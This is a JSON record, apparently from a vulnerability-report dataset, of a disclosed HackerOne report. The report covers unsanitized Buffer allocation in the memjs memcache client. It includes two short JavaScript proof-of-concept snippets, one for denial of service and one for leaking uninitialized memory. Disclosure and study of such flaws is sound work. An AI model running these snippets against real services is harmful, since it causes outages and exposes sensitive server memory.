@@ -1,0 +1,38 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "chalker ",
+  "title": "`memjs` allocates and stores buffers on typed input, resulting in DoS and uninitialized memory usage",
+  "content": "\nI would like to report a Buffer allocation vulnerability in memjs.\nIn cases when the attacker is able to pass typed input (e.g. via JSON) to the storage, it allows to cause DoS (on all Node.js versions) and to store (and potentially later extract) chunks of uninitialized server memory containing sensitive data.\nModule\nmodule name: memjs\nversion: 1.1.0\nnpm page: https://www.npmjs.com/package/memjs\nModule Description\nMemJS is a pure Node.js client library for using memcache, in particular, the MemCachier service. It uses the binary protocol and support SASL authentication.\nModule Stats\n186 downloads in the last day\n2 903 downloads in the last week\n12 037 downloads in the last month\n~144 444 estimated downloads per year (yay, a pretty number)\nVulnerability\nVulnerability Description\nmemjs passes value option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'value' parameter (e.g. JSON).\nSteps To Reproduce:\nmemcached should be up and running.\nDoS\nCode 163 Bytes\n1var client = require('memjs').Client.create()\n2function tick() {\n3  var value = 2e9;\n4  client.set('key', value, {expires: 600 }, () => {});\n5}\n6setInterval(tick, 200);\nUninitialized memory exposed (when running on Node.js below 8.0)\nCode 166 Bytes\n1var client = require('memjs').Client.create()\n2var value = 100;\n3client.set('key', value, {expires: 600 }, () => {});\n4client.get('key', (err, val) => console.log(val));\nSupporting Material/References:\nOS: Arch Linux current\nNode.js 9.5.0\nnpm 5.6.0\nmemcached 1.5.5\nWrap up\nI contacted the maintainer to let him know: N\nI opened an issue in the related repository: N\nImpact\nDenial of service\nSensitive data leak (on Node.js < 8.x)\n\n",
+  "severity": [
+    10.0,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Uncontrolled Resource Consumption"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1530091500,
+  "report_url": "https://hackerone.com/reports/319809",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install and run memcached server"
+    ],
+    [
+      2,
+      "Run the provided JavaScript code to demonstrate DoS or memory leak"
+    ]
+  ],
+  "vuln_description": "The memjs module passes the value option to the Buffer constructor without proper sanitization, allowing an attacker to cause Denial of Service (DoS) or expose uninitialized memory when they can submit typed input to the 'value' parameter (e.g., via JSON).",
+  "reason": "The vulnerability involves a straightforward misuse of the Buffer constructor without proper input validation. The attack does not require complex interactions or state manipulation, and the issue is a well-known class of vulnerability in Node.js applications.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
